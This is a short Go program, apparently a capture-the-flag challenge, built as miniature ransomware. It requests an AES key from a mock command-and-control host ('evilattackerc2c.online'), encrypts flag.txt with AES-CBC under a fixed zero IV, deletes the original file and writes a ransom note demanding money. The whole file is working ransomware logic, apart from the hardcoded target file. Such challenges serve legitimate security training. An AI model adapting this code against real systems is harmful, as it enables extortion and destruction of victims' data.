package main

import (
	"encoding/hex"
	"encoding/json"
	"errors"
	"net/http"

	"os"

	"crypto/aes"
	"crypto/cipher"

	"github.com/google/uuid"
)

type Key struct {
	Key string `json:"key"`
}

func fetchKey(id uuid.UUID) (key []byte) {
	res, err := http.Get("http://evilattackerc2c.online/gen_key/" + id.String())

	if err != nil {
		panic(err)
	}

	defer res.Body.Close()

	var k Key
	err = json.NewDecoder(res.Body).Decode(&k)

	if err != nil {
		panic(err)
	}

	key, err = hex.DecodeString(k.Key)
	if err != nil {
		panic(err)
	}

	return key
}

func Pad(input []byte, blockSize int) []byte {
	r := len(input) % blockSize
	pl := blockSize - r
	for i := 0; i < pl; i++ {
		input = append(input, byte(pl))
	}
	return input
}

func checkPaddingIsValid(input []byte, paddingLength int) error {
	if len(input) < paddingLength {
		return errors.New("invalid padding")
	}
	p := input[len(input)-(paddingLength):]
	for _, pc := range p {
		if uint(pc) != uint(len(p)) {
			return errors.New("invalid padding")
		}
	}
	return nil
}

func Unpad(input []byte) ([]byte, error) {
	if len(input) == 0 {
		return nil, nil
	}

	pc := input[len(input)-1]
	pl := int(pc)
	err := checkPaddingIsValid(input, pl)
	if err != nil {
		return nil, err
	}
	return input[:len(input)-pl], nil
}

func encryptFlag(key []byte) {
	plaintext, err := os.ReadFile("flag.txt")
	if err != nil {
		panic(err)
	}

	paddedPlaintext := Pad(plaintext, 16)

	c, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	encrypted := make([]byte, len(paddedPlaintext))
	mode := cipher.NewCBCEncrypter(c, []byte("0000000000000000"))
	mode.CryptBlocks(encrypted, paddedPlaintext)

	err = os.WriteFile("flag.enc", encrypted, 0644)
	if err != nil {
		panic(err)
	}

	err = os.Remove("flag.txt")
	if err != nil {
		panic(err)
	}
}

func leaveMessage(id uuid.UUID) {
	err := os.WriteFile("message.txt", []byte("Your id is: "+id.String()+"\nSend all of your money to me to recover it!"), 0644)
	if err != nil {
		panic(err)
	}
}

func main() {
	id := uuid.New()
	key := fetchKey(id)
	encryptFlag(key)
	leaveMessage(id)
}
